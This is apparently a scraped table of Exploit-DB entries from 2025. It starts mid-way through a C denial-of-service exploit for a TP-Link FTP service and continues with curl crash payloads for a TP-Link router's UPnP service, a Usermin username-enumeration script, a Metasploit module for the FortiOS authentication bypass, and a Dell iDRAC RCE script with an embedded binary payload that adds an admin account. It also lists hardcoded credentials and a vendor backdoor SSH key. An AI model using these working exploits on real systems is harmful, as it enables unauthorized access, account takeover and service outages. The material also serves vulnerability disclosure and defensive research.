sizeof(ICMPECHOREPLY) + 32; pingctx.replybuffer = malloc(pingctx.replysize); inetpton(AFINET, targetip, &pingctx.targetaddr); sock = socket(AFINET, SOCKSTREAM, 0); if (sock == INVALIDSOCKET) { logmsg(""[-]"", ""Socket creation failed""); goto cleanup; server.sinfamily = AFINET; server.sinport = htons(targetport); inetpton(AFINET, targetip, &server.sinaddr); logmsg(""[]"", ""Connecting to target FTP server.""); if (connect(sock, (struct sockaddr)&server, sizeof(server)) < 0) { logmsg(""[-]"", ""Connection failed""); goto cleanup; logmsg(""[+]"", ""Connected successfully""); if (!checkconnectivity(&pingctx)) { logmsg(""[-]"", ""No initial connectivity to target""); goto cleanup; if ((recvsize = recv(sock, serverreply, sizeof(serverreply) - 1, 0)) == SOCKETERROR) { logmsg(""[-]"", ""Failed to receive banner""); goto cleanup; serverreply[recvsize] = '\0'; logmsg(""[*]"", serverreply); char payload = generate_exact_crash_payload(); if (!payload) { goto cleanup; log_msg(""[]"", ""Sending crash payload.""); hexdump(""Payload hex dump (first 32 bytes)"", payload, 32); if (send(sock, payload, TOTALPAYLOADLENGTH, 0) < 0) { logmsg(""[-]"", ""Failed to send payload""); free(payload); goto cleanup; free(payload); logmsg(""[+]"", ""Payload sent successfully""); logmsg(""[*]"", ""Monitoring target status.""); Sleep(1000); // Wait a bit for crash to take effect int failedpings = 0; for (int i = 0; i < MAXPINGRETRIES; i++) { if (!checkconnectivity(&pingctx)) { failedpings++; if (failedpings >= 3) { logmsg(""[+]"", ""Target crash confirmed!""); success = TRUE; goto cleanup; Sleep(500); logmsg(""[-]"", ""Target appears to still be responsive""); cleanup: if (sock != INVALIDSOCKET) { closesocket(sock); if (pingctx.icmphandle != INVALIDHANDLEVALUE) { IcmpCloseHandle(pingctx.icmphandle); if (pingctx.replybuffer) { free(pingctx.reply_buffer); WSACleanup(); return success; int main(void) { printf(""\nTP-Link VN020 FTP Memory Corruption"
CVE-2024-12342,"{""CVE-2024-12342"": 1}",2025-04-17,TP-Link VN020 F3v(T) TT_V6.2.1021 - Denial Of Service (DOS),https://www.exploit-db.com/exploits/52250,"Exploit Title: TP-Link VN020 F3v(T) TTV6.2.1021 - Denial Of Service (DOS) Date: 10/22/2024 Exploit Author: Mohamed Maatallah Vendor Homepage: <URL> Version: TTV6.2.1021 (VN020-F3v(T)) Tested on: VN020-F3v(T) Router (Hardware Version 1.0) CVE: CVE-2024-12342 Description: Two critical vulnerabilities discovered in TP-Link VN020-F3v(T) router's UPnP implementation, affecting the WANIPConnection service. The vulnerabilities allow unauthenticated attackers to cause denial of service and potential memory corruption through malformed SOAP requests. Proof of Concept 1 (Missing Parameters DoS): curl -v -X POST "" <URL> \ -H ""Content-Type: text/xml"" \ -H ""SOAPAction: \""urn:schemas-upnp-org:service:WANIPConnection:1AddPortMapping\"""" \ -d ' hello ' Proof of Concept 2 (Memory Corruption): curl -v -X POST "" <URL> \ -H ""Content-Type: text/xml"" \ -H ""SOAPAction: \""urn:schemas-upnp-org:service:WANIPConnection:1SetConnectionType\"""" \ -d ' '""$(perl -e 'print ""%x"" x 10000;')""' '"
CVE-2024-42640,"{""CVE-2024-42640"": 1}",2025-04-17,Angular-Base64-Upload Library 0.1.21 - Unauthenticated Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52253,Exploit Title: Angular-Base64-Upload Library 0.1.21 - Unauthenticated Remote Code Execution (RCE) Date: 10 October 2024 Discovered by : Ravindu Wickramasinghe | rvz () Exploit Author: Ravindu Wickramasinghe | rvz () Vendor Homepage: <URL> Software Link: <URL> Version: prior to v0.1.21 Tested on: Arch Linux CVE : CVE-2024-42640 Severity: Critical - 10.0 (CVSS 4.0) Github Link : <URL> Blog Post : <URL> import re import subprocess import requests import sys import os import uuid import base64 import cmd from urllib.parse import urlparse def banner(): print(' \033[2mCVE-2024-42640\033[0m - Unauthenticated RCE via Anuglar-Base64-Upload Library \033[2m
CVE-2024-44762,"{""CVE-2024-44762"": 1}",2025-04-17,Usermin 2.100 - Username Enumeration,https://www.exploit-db.com/exploits/52254,"Exploit Title: Usermin 2.100 - Username Enumeration Date: 10.02.2024 Exploit Author: Kjesper Vendor Homepage: <URL> Software Link: <URL> Version: <= 2.100 Tested on: Kali Linux CVE: CVE-2024-44762 # <URL> #!/usr/bin/python3 # -- coding: utf-8 -- Usermin - Username Enumeration (Version 2.100) Usage: UserEnumUsermin.py -u HOST -w WORDLISTUSERS Example: UserEnumUsermin.py -u <URL> -w users.txt import requests import json import requests import argparse import sys from urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disablewarnings(category=InsecureRequestWarning) parser = argparse.ArgumentParser() parser.addargument(""-u"", ""--url"", help = ""use -u with the url to the host of usermin, EX: \""-u <URL> parser.addargument(""-w"", ""--wordlistusers"", help = ""use -w with the username wordlist, EX: \""-w users.txt\"""") args = parser.parseargs() if len(sys.argv) != 5: print(""Please provide the -u for URL and -w for the wordlist containing the usernames"") print(""EX: python3 UsernameEnum.py -u <URL> -w users.txt"") exit() usernameFile = open(args.wordlistusers, 'r') dataUsername = usernameFile.read() usernameFileIntoList = dataUsername.split(""\n"") usernameFile.close() for i in usernameFileIntoList: newHeaders = {'Content-type': 'application/x-www-form-urlencoded', 'Referer': '%s/passwordchange.cgi' % args.url} params = {'user':i, 'pam':'', 'expired':'2', 'old':'fakePassword', 'new1':'password', 'new2':'password'} response = requests.post('%s/password_change.cgi' % args.url, data=params, verify=False, headers=newHeaders) if ""Failed to change password: The current password is incorrect."" in response.text: print(""Possible user found with username: "" + i) if ""Failed to change password: Your login name was not found in the password file!"" not in response.text and ""Failed to change password: The current password is incorrect."" not in response.text: print(""Application is most likely not vulnerable and are therefore quitting."") exit() comment out line 33-35 if you would still like to try username enumeration."
CVE-2024-48445,"{""CVE-2024-48445"": 1}",2025-04-17,compop.ca 3.5.3 - Arbitrary code Execution,https://www.exploit-db.com/exploits/52257,"Exploit Title: compop.ca 3.5.3 - Arbitrary code Execution Google Dork: Terms of Use inurl:compop.vip Date: 22/12/2024 Exploit Author: dmlino Vendor Homepage: <URL> Version: 3.5.3 CVE : CVE-2024-48445 The restaurant management system implements authentication using a Unix timestamp parameter (""ts"") in the URL. This implementation is vulnerable to manipulation as it relies solely on time-based validation without proper authentication mechanisms. Technical Details: The application uses a URL parameter ""ts"" which accepts a Unix timestamp value. Steps: 1. Find a vulnerable restaurant. 2. Get the current time in the UNIX format: Linux: $date +%s Windows Powershell: [int](Get-Date -UFormat %s -Millisecond 0) 3. Replace parameter in url with the new value"
CVE-2024-12955,"{""CVE-2024-12955"": 1}",2025-04-17,Blood Bank &amp; Donor Management System 2.4 - CSRF Improper Input Validation,https://www.exploit-db.com/exploits/52256,Exploit Title: Blood Bank & Donor Management System 2.4 - CSRF Improper Input Validation Google Dork: N/A Date: 2024-12-26 Exploit Author: Kwangyun Keum Vendor Homepage: <URL> Software Link: <URL> Version: 2.4 Tested on: Windows 10 / Kali Linux with Apache and MySQL CVE: CVE-2024-12955 #Description: Blood Bank & Donor Management System v2.4 suffers from a Cross-Site Request Forgery (CSRF) vulnerability due to the absence of CSRF tokens for critical functionalities such as logout. An attacker can craft a malicious iframe embedding the logout URL and trick a victim into clicking it. This results in the victim being logged out without their consent. #Steps to Reproduce: 1. Deploy Blood Bank & Donor Management System v2.4. 2. Log in as any user. 3. Use the following
CVE-2024-48840,"{""CVE-2024-48840"": 1}",2025-04-17,ABB Cylon Aspect 3.08.02 (deployStart.php) - Unauthenticated Command Execution,https://www.exploit-db.com/exploits/52251,"Exploit Title: ABB Cylon Aspect 3.08.02 (deployStart.php) Unauthenticated Command Execution Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an unauthenticated shell command execution vulnerability through the deployStart.php script. This allows any user to trigger the execution of 'rundeploy.sh' script, which initializes the Java deployment server that sets various configurations, potentially causing unauthorized server initialization and performance issues. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2024-5891 Advisory URL: <URL> CVE ID: CVE-2024-48840 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl <URL>"
CVE-2021-33216,"{""CVE-2021-33216"": 1}",2025-04-16,Ruckus IoT Controller 1.7.1.0 - Undocumented Backdoor Account,https://www.exploit-db.com/exploits/52242,"Exploit Title: CommScope Ruckus IoT Controller 1.7.1.0 - Undocumented Account Date: 2021.05.26 Exploit Author: korelogic Vendor Homepage: <URL> Affected Product: Ruckus IoT Controller Version: 1.7.1.0 and earlier Tested on: Linux CVE : CVE-2021-33216,CVE-2019-1000018 KL-001-2021-007: CommScope Ruckus IoT Controller Undocumented Account Advisory ID: KL-001-2021-007 Publication Date: 2021.05.26 Publication URL: <URL> 1. Vulnerability Details Affected Vendor: CommScope Affected Product: Ruckus IoT Controller Affected Version: 1.7.1.0 and earlier Platform: Linux CWE Classification: CWE-798: Use of Hard-coded Credentials, CWE-912: Hidden Functionality CVE ID: CVE-2021-33216 2. Vulnerability Description An upgrade account is included in the IoT Controller OVA that provides the vendor undocumented access via Secure Copy (SCP). 3. Technical Description Once the OVA is imported into VirtualBox, a VMDK file is created. The VMDK file can be mounted and the directory structure and its contents can be perused. An authorizedkeys file exists that allows an individual/organization possessing the SSH private key to access the virtual appliance using the 'vriotiotupgrade' account. The 'vriotiotupgrade' account is restricted to scp, per the rssh configuration. Additionally, it appears that the IoT Controller has rssh version 2.3.4 installed and in use. At the time of this advisory, there are at least three remote command injection vulnerabilities in this particular version of rssh: CVE-2019-3463, CVE-2019-3464 and CVE-2019-1000018. 4. Mitigation and Remediation Recommendation The vendor has released an updated firmware (1.8.0.0) which remediates the described vulnerability. Firmware and release notes are available at: <URL> 5. Credit This vulnerability was discovered by Jim Becher () of KoreLogic, Inc. 6. Disclosure Timeline 2021.03.30 - KoreLogic submits vulnerability details to CommScope. 2021.03.30 - CommScope acknowledges receipt and the intention to investigate. 2021.04.06 - CommScope notifies KoreLogic that this issue, along with several others reported by KoreLogic, will require more than the standard 45 business day remediation timeline. 2021.04.06 - KoreLogic agrees to extend disclosure embargo if necessary. 2021.04.30 - CommScope informs KoreLogic that remediation for this vulnerability will be available inside of the standard 45 business day timeline. Requests KoreLogic acquire CVE number for this vulnerability. 2021.05.14 - 30 business days have elapsed since the vulnerability was reported to CommScope. 2021.05.17 - CommScope notifies KoreLogic that the patched version of the firmware will be available the week of 2021.05.24. 2021.05.19 - KoreLogic requests CVE from MITRE. 2021.05.19 - MITRE issues CVE-2021-33216. 2021.05.25 - CommScope releases firmware 1.8.0.0 and associated advisory. 2021.05.26 - KoreLogic public disclosure. 7. Proof of Concept With the VMDK file mounted at the current working directory: $ find . -name authorizedkeys ./VRIOT/ap-images/authorizedkeys ./VRIOT/ops/ap-images/authorizedkeys $ cat VRIOT/ap-images/authorizedkeys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCp1X4UH+0IALnLKsqbSZwgbzA1clXWXguNpTZ+Km7irkMaXVRt6IL78mdK+nKUvvQcRnAhQ0TgoqINrdLzMTYwoVaOcBq5Lw21A5JrP8IQANMAiVSM30umJYuTqnbPO4HHIi9/Gk/wUtJiwvD/ygNx7z0g1a9PIzQxOITLpwVkEU2iDdlrZDHR35jI/ddRRsbPe9ezeYGDoprgQagw634fa9tzI74oj5/Xh64679yjA0bQx+i8ZXSIHFPSHp0yiDyMZfvLIqdqb0mEAN1JnaHfIiq4o8/wa8zp7nVADo6Pxweklc1kqALFUxrzdP/6Z0hITp1Ke/xdA2S4LT3ye85QVM/k3Dd54qFpMAJsinYb18Ykyj0PTZskcBWB+l9VevpJXv+3DDH2+98Ledv/fnXQ9VapxW572fX2HkEoh4Nmt5VUx0JPR/0onwOVeuwQLp5qnHxmzgL8DMS62QkTT1VdaCqXS01DMPorKQUtmvAxohJUJX4df9JoOcwRpvKSspn+6UU1krPZHX1QYvPrRsfYhJ9SCzrVxmuC0DR3FqxGoix5su4DqCpRxq0QhwC4+DwIMt4KTIjF3p35s+bjP1luwITJOxVlIswpyZKS0hITFLJtAE7c493wX7hxUdy+LfyHXlMIoJcYM11WXLAysHcWyfmSpQ8H5GV0vxela0Qg7Q== chandini.venkatesh.com $ cat VRIOT/ops/ap-images/authorizedkeys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCp1X4UH+0IALnLKsqbSZwgbzA1clXWXguNpTZ+Km7irkMaXVRt6IL78mdK+nKUvvQcRnAhQ0TgoqINrdLzMTYwoVaOcBq5Lw21A5JrP8IQANMAiVSM30umJYuTqnbPO4HHIi9/Gk/wUtJiwvD/ygNx7z0g1a9PIzQxOITLpwVkEU2iDdlrZDHR35jI/ddRRsbPe9ezeYGDoprgQagw634fa9tzI74oj5/Xh64679yjA0bQx+i8ZXSIHFPSHp0yiDyMZfvLIqdqb0mEAN1JnaHfIiq4o8/wa8zp7nVADo6Pxweklc1kqALFUxrzdP/6Z0hITp1Ke/xdA2S4LT3ye85QVM/k3Dd54qFpMAJsinYb18Ykyj0PTZskcBWB+l9VevpJXv+3DDH2+98Ledv/fnXQ9VapxW572fX2HkEoh4Nmt5VUx0JPR/0onwOVeuwQLp5qnHxmzgL8DMS62QkTT1VdaCqXS01DMPorKQUtmvAxohJUJX4df9JoOcwRpvKSspn+6UU1krPZHX1QYvPrRsfYhJ9SCzrVxmuC0DR3FqxGoix5su4DqCpRxq0QhwC4+DwIMt4KTIjF3p35s+bjP1luwITJOxVlIswpyZKS0hITFLJtAE7c493wX7hxUdy+LfyHXlMIoJcYM11WXLAysHcWyfmSpQ8H5GV0vxela0Qg7Q== chandini.venkatesh.com $ grep ""ap-images"" etc/passwd vriotiotupgrade:x:1002:1002::/VRIOT/ap-images/:/usr/bin/rssh $ tail -8 etc/ssh/sshdconfig Match User vriotiotupgrade PasswordAuthentication no AuthorizedKeysFile /VRIOT/ap-images/authorizedkeys Match User vriotha PasswordAuthentication yes $ grep -v ^etc/rssh.conf logfacility = LOG_USER allowscp umask = 022 The contents of this advisory are copyright(c) 2021 KoreLogic, Inc. and are licensed under a Creative Commons Attribution Share-Alike 4.0 (United States) License: <URL> KoreLogic, Inc. is a founder-owned and operated company with a proven track record of providing security services to entities ranging from Fortune 500 to small and mid-sized companies. We are a highly skilled team of senior security consultants doing by-hand security assessments for the most important networks in the U.S. and around the world. We are also developers of various tools and resources aimed at helping the security community. <URL> Our public vulnerability disclosure policy is available at: <URL>"
CVE-2023-26602,"{""CVE-2023-26602"": 1}",2025-04-16,ASUS ASMB8 iKVM 1.14.51 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52244,"Exploit Title: ASUS ASMB8 iKVM 1.14.51 - Remote Code Execution (RCE) Date: 2023-02-16 Exploit Author: d1g.net for NetworkSEC [NWSSA-002-2023], SC Vendor Homepage: <URL> Version/Model: ASMB8 iKVM Firmware <= 1.14.51 (probably others) Tested on: Linux AMI2CFDA1C7570E 2.6.28.10-ami armv5tejl CVE: CVE-2023-26602 0x00 DESCRIPTION During a recent engagement, a remote server management interface has been discovered. Furthermore, SNMPv2 was found to be enabled, offering write access to the private community, subsequently allowing us to introduce SNMP arbitrary extensions to achieve RCE. We also found a hardcoded account sysadmin:superuser by cracking the shadow file (md5crypt) found on the system and identifed an ""anonymous"" user w/ the same password, however a lock seems to be in place to prevent using these credentials via SSH (running defshell as default shell). 0x01 IMPACT By exploiting SNMP arbitrary extension, we are able to run any command on the system w/ root privileges, and we are able to introduce our own user circumventing the defshell restriction for SSH. 0x02 PROOF OF CONCEPT ("
CVE-2024-11392,"{""CVE-2024-11392"": 1}",2025-04-16,Hugging Face Transformers MobileViTV2 4.41.1 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52227,"Exploit Title: Hugging Face Transformers MobileViTV2 RCE Date: 29-11-2024 Exploit Author: The Kernel Panic Vendor Homepage: <URL> Software Link: <URL> Version: 4.41.1 Tested on: Linux, Windows, Mac CVE : CVE-2024-11392 Code flow from input to the vulnerable condition: 1. The user downloads a third-party ml-cvnet model alongside its configuration file. 2. The user runs the convertmlcvnetstopytorch.py script and passes the configuration file to it. 3. The convertmlcvnetstopytorch.py script de-serializes the configuration file and executes the malicious code."
CVE-2024-23733,"{""CVE-2024-23733"": 1}",2025-04-16,WebMethods Integration Server 10.15.0.0000-0092 - Improper Access on Login Page,https://www.exploit-db.com/exploits/52237,"Exploit Title: WebMethods Integration Server 10.15.0.0000-0092 - Improper Access on Login Page Date: 25-01-2024 Exploit Author: Rasime Ekici Vendor Homepage: <URL> Version: 10.15.0000-0092 Tested on: 10.15.0000-0092 CVE : 2024-23733 Description: The /WmAdmin/,/invoke/vm.server/login login page in the Integration Server in Software AG webMethods 10.15.0 before Core Fix7 allows remote attackers to reach the administration panel,discovering server hostname and version information by sending arbitary username and blank password to the /WmAdmin/#/login/ uri Interpret the http traffic and send a dummy username with blank password on login screen and drop the request to ""/admin/navigation/license"" to not logged out.Thus you may able to see: -real hostname of the installed server -version info -administrative api endpoints"
CVE-2022-40684,"{""CVE-2022-40684"": 1}",2025-04-16,"Fortinet FortiOS, FortiProxy, and FortiSwitchManager 7.2.0 - Authentication bypass",https://www.exploit-db.com/exploits/52239,"Exploit Title: Fortinet FortiOS, FortiProxy, and FortiSwitchManager 7.2.0 - Authentication bypass Date: 2022-10-10 Exploit Author: Zach Hanley, SC Vendor Homepage: <URL> Version: 7.0.0 Tested on: Linux CVE : CVE-2022-40684 This module requires Metasploit: <URL> Current source: <URL> class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::Remote::SSH prepend Msf::Exploit::Remote::AutoCheck attraccessor :sshsocket def initialize(info = {}) super( updateinfo( info, 'Name' => 'Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.', 'Description' => %q{ This module exploits an authentication bypass vulnerability in the Fortinet FortiOS, FortiProxy, and FortiSwitchManager API to gain access to a chosen account. And then add a SSH key to the authorizedkeys file of the chosen account, allowing to login to the system with the chosen account. Successful exploitation results in remote code execution. 'Author' => [ 'Heyder Andrade <>', Metasploit module 'Zach Hanley <>', #"
CVE-2018-1207,"{""CVE-2018-1207"": 1}",2025-04-16,Dell EMC iDRAC7/iDRAC8 2.52.52.52 -  Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52246,"Exploit Title: Dell EMC iDRAC7/iDRAC8 2.52.52.52 - Remote Code Execution (RCE) via file upload Date: 2024-08-28 Exploit Author: Photubias Vendor Homepage: <URL> Vendor Advisory: [1] <URL> Version: integrated Dell Remote Access Console v7 & v8 < 2.52.52.52 Tested on: iDRAC 7 & 8 CVE: CVE-2018-1207 r' Copyright 2024 Photubias(c) This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see . File name CVE-2018-1207.py written by Photubias CVE-2018-1207 is an unauthenticated file upload and so library execution vulnerability on the HTTPS web interface. This exploit contains a checker and a builtin exploit to add a webuser for remote admin access Manual verification example, if libraries are returned, the target is vulnerable: curl -ik "" <URL> Feel free to scan your network via the iDRAC fingerprinter to find vulnerable systems: <URL> This is a native implementation, written in Python 3 and only requires requests (pip3 install requests) Works equally well on Windows as Linux (as MacOS, probably ;-) Features: vulnerability checker + exploit WARNING: The built-in payload is precompiled and does this: - Configure USER ID 13 with username 'user', password 'Passw0rd' and as an iDRAC webadmin - Any user that might be at ID 13 will be overridden and is unrecoverable - TIP1: use racadm for command line access after exploitation (also uses TCP/443) - TIP2: use racadm to retrieve user hash with command: racadm -r -u user -p Passw0rd get iDRAC.Users.2 import requests, optparse, base64, struct, time requests.packages.urllib3.disablewarnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) requests.warnings.filterwarnings('ignore', category=DeprecationWarning) iTimeout = 10 sPayloadCode ='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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA